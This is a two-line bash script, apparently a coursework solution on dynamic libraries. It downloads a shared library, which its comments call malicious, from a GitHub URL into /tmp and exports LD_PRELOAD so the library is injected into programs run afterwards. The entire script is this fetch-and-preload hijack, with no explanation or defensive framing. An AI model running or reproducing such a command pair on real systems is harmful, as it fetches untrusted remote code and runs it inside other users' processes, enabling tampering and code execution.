#!/bin/bash
wget -P /tmp https://github.com/Shighi/alx-low_level_programming/raw/main/0x18-dynamic_libraries/iwin.so  # Download the malicious library
export LD_PRELOAD=/tmp/iwin.so  # Preload the malicious library
